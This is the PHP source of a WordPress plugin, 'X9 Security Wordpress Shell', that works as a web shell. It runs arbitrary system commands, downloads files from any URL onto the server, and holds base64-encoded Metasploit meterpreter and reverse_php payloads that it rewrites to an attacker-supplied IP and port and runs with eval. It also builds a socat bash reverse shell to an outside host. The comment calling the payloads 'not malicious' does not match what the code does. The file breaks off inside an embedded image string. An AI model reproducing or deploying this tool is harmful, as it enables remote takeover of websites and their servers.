<?php
//ini_set('display_errors',1);
ini_set("memory_limit","1024M");
ini_set('max_execution_time', 999999);
//error_reporting(E_ALL);


/**
 * Plugin Name: X9 Security Wordpress Shell
 * Plugin URI: https://github.com/X9-Security
 * Description: X9 Security Wordpress Shell. Control Wordpress websites directly from a plugin!
 * Version: 1.0
 * Author: Xorus
 * Author URI: https://www.x9security.com
 */

add_action( 'admin_menu', 'my_plugin_menu' );

/** Step 1. */
function my_plugin_menu() {
	add_options_page( 'X9 Security Wordpress Shell', 'Wordpress Shell', 'manage_options', 'x9-shell', 'my_plugin_options' );
}

/** Step 3. */
function my_plugin_options() {
	if ( !current_user_can( 'manage_options' ) )  {
		wp_die( __( 'You do not have sufficient permissions to access this page.' ) );
	}
	echo '<script type="text/javascript" src="' . plugins_url( 'ajax.js', __FILE__ ) . '"></script>';

	//msfvenom -p php/meterpreter/reverse_tcp LHOST=localhost LPORT=4444 -f raw | cut -b 14-1120 | base64
	//This payload will be decoded and edited to the supplied IP and port when a meterpreter shell is called.
	//The msfvenom line is supplied for verification that this is not a malicious payload.
	$metershell =  'ZXJyb3JfcmVwb3J0aW5nKDApOyAkaXAgPSAnbG9jYWxob3N0JzsgJHBvcnQgPSA0NDQ0OyBpZiAo';
	$metershell .= 'KCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0g';
	$metershell .= 'JGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMg';
	$metershell .= 'JiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwg';
	$metershell .= 'JHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2Ny';
	$metershell .= 'ZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFN';
	$metershell .= 'LCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICgh';
	$metershell .= 'JHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRp';
	$metershell .= 'ZSgnbm8gc29ja2V0IGZ1bmNzJyk7IH0gaWYgKCEkcykgeyBkaWUoJ25vIHNvY2tldCcpOyB9IHN3';
	$metershell .= 'aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVh';
	$metershell .= 'azsgY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7IH0gaWYg';
	$metershell .= 'KCEkbGVuKSB7IGRpZSgpOyB9ICRhID0gdW5wYWNrKCJObGVuIiwgJGxlbik7ICRsZW4gPSAkYVsn';
	$metershell .= 'bGVuJ107ICRiID0gJyc7IHdoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgeyBzd2l0Y2ggKCRzX3R5';
	$metershell .= 'cGUpIHsgY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJy';
	$metershell .= 'ZWFrOyBjYXNlICdzb2NrZXQnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIp';
	$metershell .= 'KTsgYnJlYWs7IH0gfSAkR0xPQkFMU1snbXNnc29jayddID0gJHM7ICRHTE9CQUxTWydtc2dzb2Nr';
	$metershell .= 'X3R5cGUnXSA9ICRzX3R5cGU7IGlmIChleHRlbnNpb25fbG9hZGVkKCdzdWhvc2luJykgJiYgaW5p';
	$metershell .= 'X2dldCgnc3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWwnKSkgeyAkc3Vob3Npbl9ieXBhc3M9';
	$metershell .= 'Y3JlYXRlX2Z1bmN0aW9uKCcnLCAkYik7ICRzdWhvc2luX2J5cGFzcygpOyB9IGVsc2UgeyBldmFs';
	$metershell .= 'KCRiKTsgfSBkaWUoKTsK';


	//msfvenom -p php/reverse_php LHOST=localhost LPORT=4444 -f raw | tr -d "\n" | cut -b 23-9999 | base64
	//This payload will be decoded and edited to the supplied IP and port when a meterpreter shell is called.
	//The msfvenom line is supplied for verification that this is not a malicious payload.
	$simpleshell =  'QGVycm9yX3JlcG9ydGluZygwKTsgICAgICBAc2V0X3RpbWVfbGltaXQoMCk7IEBpZ25vcmVfdXNl';
	$simpleshell .= 'cl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7ICAgICAgJGRpcz1A';
	$simpleshell .= 'aW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKTsgICAgICBpZighZW1wdHkoJGRpcykpeyAgICAg';
	$simpleshell .= 'ICAgJGRpcz1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRkaXMpOyAgICAgICAgJGRpcz1l';
	$simpleshell .= 'eHBsb2RlKCcsJywgJGRpcyk7ICAgICAgICAkZGlzPWFycmF5X21hcCgndHJpbScsICRkaXMpOyAg';
	$simpleshell .= 'ICAgIH1lbHNleyAgICAgICAgJGRpcz1hcnJheSgpOyAgICAgIH0gICAgICAgICAgJGlwYWRkcj0n';
	$simpleshell .= 'bG9jYWxob3N0JzsgICAgJHBvcnQ9NDQ0NDsgICAgaWYoIWZ1bmN0aW9uX2V4aXN0cygnVFl2V2Vj';
	$simpleshell .= 'QUUnKSl7ICAgICAgZnVuY3Rpb24gVFl2V2VjQUUoJGMpeyAgICAgICAgZ2xvYmFsICRkaXM7ICAg';
	$simpleshell .= 'ICAgICAgICAgICBpZiAoRkFMU0UgIT09IHN0cnBvcyhzdHJ0b2xvd2VyKFBIUF9PUyksICd3aW4n';
	$simpleshell .= 'ICkpIHsgICAgICAgICRjPSRjLiIgMj4mMVxuIjsgICAgICB9ICAgICAgJFVMQ0lTTFk9J2lzX2Nh';
	$simpleshell .= 'bGxhYmxlJzsgICAgICAkQ2hBcURxPSdpbl9hcnJheSc7ICAgICAgICAgICAgaWYoJFVMQ0lTTFko';
	$simpleshell .= 'J3N5c3RlbScpYW5kISRDaEFxRHEoJ3N5c3RlbScsJGRpcykpeyAgICAgICAgb2Jfc3RhcnQoKTsg';
	$simpleshell .= 'ICAgICAgIHN5c3RlbSgkYyk7ICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsgICAgICAgIG9i';
	$simpleshell .= 'X2VuZF9jbGVhbigpOyAgICAgIH1lbHNlICAgICAgaWYoJFVMQ0lTTFkoJ3Bhc3N0aHJ1JylhbmQh';
	$simpleshell .= 'JENoQXFEcSgncGFzc3RocnUnLCRkaXMpKXsgICAgICAgIG9iX3N0YXJ0KCk7ICAgICAgICBwYXNz';
	$simpleshell .= 'dGhydSgkYyk7ICAgICAgICAkbz1vYl9nZXRfY29udGVudHMoKTsgICAgICAgIG9iX2VuZF9jbGVh';
	$simpleshell .= 'bigpOyAgICAgIH1lbHNlICAgICAgaWYoJFVMQ0lTTFkoJ3BvcGVuJylhbmQhJENoQXFEcSgncG9w';
	$simpleshell .= 'ZW4nLCRkaXMpKXsgICAgICAgICRmcD1wb3BlbigkYywncicpOyAgICAgICAgJG89TlVMTDsgICAg';
	$simpleshell .= 'ICAgIGlmKGlzX3Jlc291cmNlKCRmcCkpeyAgICAgICAgICB3aGlsZSghZmVvZigkZnApKXsgICAg';
	$simpleshell .= 'ICAgICAgICAkby49ZnJlYWQoJGZwLDEwMjQpOyAgICAgICAgICB9ICAgICAgICB9ICAgICAgICBA';
	$simpleshell .= 'cGNsb3NlKCRmcCk7ICAgICAgfWVsc2UgICAgICBpZigkVUxDSVNMWSgncHJvY19vcGVuJylhbmQh';
	$simpleshell .= 'JENoQXFEcSgncHJvY19vcGVuJywkZGlzKSl7ICAgICAgICAkaGFuZGxlPXByb2Nfb3BlbigkYyxh';
	$simpleshell .= 'cnJheShhcnJheSgncGlwZScsJ3InKSxhcnJheSgncGlwZScsJ3cnKSxhcnJheSgncGlwZScsJ3cn';
	$simpleshell .= 'KSksJHBpcGVzKTsgICAgICAgICRvPU5VTEw7ICAgICAgICB3aGlsZSghZmVvZigkcGlwZXNbMV0p';
	$simpleshell .= 'KXsgICAgICAgICAgJG8uPWZyZWFkKCRwaXBlc1sxXSwxMDI0KTsgICAgICAgIH0gICAgICAgIEBw';
	$simpleshell .= 'cm9jX2Nsb3NlKCRoYW5kbGUpOyAgICAgIH1lbHNlICAgICAgaWYoJFVMQ0lTTFkoJ3NoZWxsX2V4';
	$simpleshell .= 'ZWMnKWFuZCEkQ2hBcURxKCdzaGVsbF9leGVjJywkZGlzKSl7ICAgICAgICAkbz1zaGVsbF9leGVj';
	$simpleshell .= 'KCRjKTsgICAgICB9ZWxzZSAgICAgIGlmKCRVTENJU0xZKCdleGVjJylhbmQhJENoQXFEcSgnZXhl';
	$simpleshell .= 'YycsJGRpcykpeyAgICAgICAgJG89YXJyYXkoKTsgICAgICAgIGV4ZWMoJGMsJG8pOyAgICAgICAg';
	$simpleshell .= 'JG89am9pbihjaHIoMTApLCRvKS5jaHIoMTApOyAgICAgIH1lbHNlICAgICAgeyAgICAgICAgJG89';
	$simpleshell .= 'MDsgICAgICB9ICAgICAgICAgICAgcmV0dXJuICRvOyAgICAgIH0gICAgfSAgICAkbm9mdW5jcz0n';
	$simpleshell .= 'bm8gZXhlYyBmdW5jdGlvbnMnOyAgICBpZihpc19jYWxsYWJsZSgnZnNvY2tvcGVuJylhbmQhaW5f';
	$simpleshell .= 'YXJyYXkoJ2Zzb2Nrb3BlbicsJGRpcykpeyAgICAgICRzPUBmc29ja29wZW4oInRjcDovL2xvY2Fs';
	$simpleshell .= 'aG9zdCIsJHBvcnQpOyAgICAgIHdoaWxlKCRjPWZyZWFkKCRzLDIwNDgpKXsgICAgICAgICRvdXQg';
	$simpleshell .= 'PSAnJzsgICAgICAgIGlmKHN1YnN0cigkYywwLDMpID09ICdjZCAnKXsgICAgICAgICAgY2hkaXIo';
	$simpleshell .= 'c3Vic3RyKCRjLDMsLTEpKTsgICAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1';
	$simpleshell .= 'aXQnIHx8IHN1YnN0cigkYywwLDQpID09ICdleGl0JykgeyAgICAgICAgICBicmVhazsgICAgICAg';
	$simpleshell .= 'IH1lbHNleyAgICAgICAgICAkb3V0PVRZdldlY0FFKHN1YnN0cigkYywwLC0xKSk7ICAgICAgICAg';
	$simpleshell .= 'IGlmKCRvdXQ9PT1mYWxzZSl7ICAgICAgICAgICAgZndyaXRlKCRzLCRub2Z1bmNzKTsgICAgICAg';
	$simpleshell .= 'ICAgICBicmVhazsgICAgICAgICAgfSAgICAgICAgfSAgICAgICAgZndyaXRlKCRzLCRvdXQpOyAg';
	$simpleshell .= 'ICAgIH0gICAgICBmY2xvc2UoJHMpOyAgICB9ZWxzZXsgICAgICAkcz1Ac29ja2V0X2NyZWF0ZShB';
	$simpleshell .= 'Rl9JTkVULFNPQ0tfU1RSRUFNLFNPTF9UQ1ApOyAgICAgIEBzb2NrZXRfY29ubmVjdCgkcywkaXBh';
	$simpleshell .= 'ZGRyLCRwb3J0KTsgICAgICBAc29ja2V0X3dyaXRlKCRzLCJzb2NrZXRfY3JlYXRlIik7ICAgICAg';
	$simpleshell .= 'd2hpbGUoJGM9QHNvY2tldF9yZWFkKCRzLDIwNDgpKXsgICAgICAgICRvdXQgPSAnJzsgICAgICAg';
	$simpleshell .= 'IGlmKHN1YnN0cigkYywwLDMpID09ICdjZCAnKXsgICAgICAgICAgY2hkaXIoc3Vic3RyKCRjLDMs';
	$simpleshell .= 'LTEpKTsgICAgICAgIH0gZWxzZSBpZiAoc3Vic3RyKCRjLDAsNCkgPT0gJ3F1aXQnIHx8IHN1YnN0';
	$simpleshell .= 'cigkYywwLDQpID09ICdleGl0JykgeyAgICAgICAgICBicmVhazsgICAgICAgIH1lbHNleyAgICAg';
	$simpleshell .= 'ICAgICAkb3V0PVRZdldlY0FFKHN1YnN0cigkYywwLC0xKSk7ICAgICAgICAgIGlmKCRvdXQ9PT1m';
	$simpleshell .= 'YWxzZSl7ICAgICAgICAgICAgQHNvY2tldF93cml0ZSgkcywkbm9mdW5jcyk7ICAgICAgICAgICAg';
	$simpleshell .= 'YnJlYWs7ICAgICAgICAgIH0gICAgICAgIH0gICAgICAgIEBzb2NrZXRfd3JpdGUoJHMsJG91dCxz';
	$simpleshell .= 'dHJsZW4oJG91dCkpOyAgICAgIH0gICAgICBAc29ja2V0X2Nsb3NlKCRzKTsgICAgfQo=';



	$OS = "";
	$kernel = "";
	$writable = 0;
	$path = "";
	$cmd = "";

	if(!isset($_REQUEST["OS"]) && !isset($_REQUEST["kernel"]))
	{
        	$type = shell_exec('uname -a');
        	if($type == "")
	        {
	                $OS = shell_exec('ver');
	        }
	        else
	        {
	                $OS = shell_exec('uname -m -o');
	                $kernel = shell_exec('uname -s -r -v');
	        }
	}


	if(isset($_REQUEST['cmd']))
	{
		$cmd = $_REQUEST['cmd'];
	}

        if(isset($_REQUEST['path']))
        {
            $path = $_REQUEST['path'];
            if(strpos($OS, 'Linux') != false)
            {
                if(substr($path, -1) != "/")
                {
                    $path .= "/";
                }
            }
            else
            {
                if(substr($path, -1) != "\\")
                {
                    $path .= "\\";
                }
            }
        }
        else
        {
            if(strpos($OS, 'Linux') != false)
            {
                $p1 = shell_exec('pwd');
		$p2 = plugins_url( 'request.php', __FILE__ );
                $path = substr($p1, 0, strpos($p1, "wp-admin") -1) . '/' . substr($p2, strpos($p2, "wp-content"), strlen($p2) - 28);
            }
            else
            {
                $path = shell_exec('cd');
            }
        }

        if(is_writable(dirname($path)) == true)
        {
                $writable = 1;
        }



	$uploadOk = -1;
	if(isset($_POST["filesubmit"]))
	{
			if(isset($_REQUEST["url"]))
			{
					$url = $_REQUEST['url'];
			if($url != "")
			{
				$data = file_get_contents($url);
				$file = $path . basename($url);
				file_put_contents($file, $data);
			}
			}

			if($_FILES['file']['name'] != "")
			{
					$file = $path . basename($_FILES["file"]["name"]);
					if(move_uploaded_file($_FILES["file"]["tmp_name"], $file))
					{
							$uploadOk = 1;
							$output .= "Successfully uploaded " . $file;
					}
					else
					{
							$uploadOk = 0;
							$output .= "Failed to upload.";
							if($_FILES["file"]["error"] == 0)
							{
									$output .= "\nPossibly unable to write to directory.";
							}
					}
			}
	}



	if(isset($_POST['shellsubmit']))
	{
			if(isset($_POST['ip']) && isset($_POST['port']))
			{
					$ip = $_POST['ip'];
					$port = $_POST['port'];
					if($ip != "" && $port != "")
					{
							if($_POST['shelltype'] == 'simpleshell')
							{
									$payload = base64_decode($simpleshell);
									$payload = str_replace("localhost", $ip, $payload);
									$payload = str_replace("4444", $port, $payload);
									eval($payload);
							}
							else if($_POST['shelltype'] == 'socatshell')
							{
									if(shell_exec('which socat') != "")
									{
											$c = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:" . $ip . ":" . $port . ' &';
											$output = $c;
											$output .= shell_exec($c);
									}
							}
							else if($_POST['shelltype'] == 'metershell')
							{
									$payload = base64_decode($metershell);
									$payload = str_replace("localhost", $ip, $payload);
									$payload = str_replace("4444", $port, $payload);
									eval($payload);
							}
					}
			}
	}






	echo '<style>';
	echo '#wpcontent { padding-left: 0px !important; }';
	echo 'tt { font-family: "Consolas"; font-size: 16px; }';
	echo '.wrap { margin: 0px !important; }';
	echo '#wpfooter { display: none; }';
	echo '</style>';
	echo '<div style="width: 100%; height: 100%; margin-top: -10px; background-color: #222;">';
	echo '<center><div style="margin-top: 10px; width:250px;"><img src="data:image/png;base64,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
